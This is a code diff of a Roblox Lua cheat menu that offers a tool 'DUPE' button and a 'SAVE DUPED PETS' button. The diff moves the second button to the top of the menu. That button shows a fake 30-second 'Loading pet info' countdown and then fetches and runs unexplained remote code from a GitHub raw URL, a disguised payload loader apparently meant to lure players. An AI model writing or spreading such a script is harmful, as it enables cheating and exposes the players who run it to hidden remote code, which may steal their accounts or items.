@@ -1,20 +1,52 @@
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local player = Players.LocalPlayer
-
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("2.0 - New Flow", "Ocean")
 
 local MainTab = Window:NewTab("Main")
 local MainSection = MainTab:NewSection("Main Controls")
 
-local toolLabel = MainSection:NewLabel("Holding: Nothing")
+-- まずSAVE DUPED PETSボタンを先に作成！
+local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
+local function setStatus(text)
+	statusLabel:Update("SAVE STATUS: " .. text)
+end
 
+local isRunning = false
+MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
+	if isRunning then return end
+	isRunning = true
+
+	task.spawn(function()
+		for i = 30, 1, -1 do
+			setStatus("⌛ Loading pet info... (" .. i .. "s)")
+			wait(1)
+		end
+
+		setStatus("🚀 Booting...")
+
+		local success, err = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
+		end)
+
+		if success then
+			setStatus("✅ Success!")
+		else
+			setStatus("❌ Error: " .. tostring(err))
+		end
+
+		isRunning = false
+	end)
+end)
+
+-- ここから他のUIを後ろに追加
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+
+local toolLabel = MainSection:NewLabel("Holding: Nothing")
 RunService.RenderStepped:Connect(function()
 	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
 	local name = tool and tool.Name or "Nothing"
-	toolLabel:Destroy()
-	toolLabel = MainSection:NewLabel("Holding: " .. name)
+	toolLabel:Update("Holding: " .. name)
 end)
 
 local dupeAmount = 1
@@ -37,34 +69,4 @@ MainSection:NewButton("DUPE", "Duplicate your tool", function()
 		local clone = tool:Clone()
 		clone.Parent = player.Backpack
 	end
-end)
-
-local statusLabel = MainSection:NewLabel("SAVE STATUS: Ready")
-
-local function setStatus(text)
-	statusLabel:Update("SAVE STATUS: " .. text)
-end
-
-setStatus("Ready")
-
--- ここでSAVE DUPED PETSボタンを作成（1回だけ！）
-MainSection:NewButton("SAVE DUPED PETS", "Starts saving after countdown", function()
-	task.spawn(function()
-		for i = 30, 1, -1 do
-			setStatus("⌛ Loading pet info... (" .. i .. "s)")
-			wait(1)
-		end
-
-		setStatus("🚀 Booting...")
-
-		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/aa362/growagarden/refs/heads/main/uitest"))()
-		end)
-
-		if success then
-			setStatus("✅ Success!")
-		else
-			setStatus("❌ Error: " .. tostring(err))
-		end
-	end)
 end)
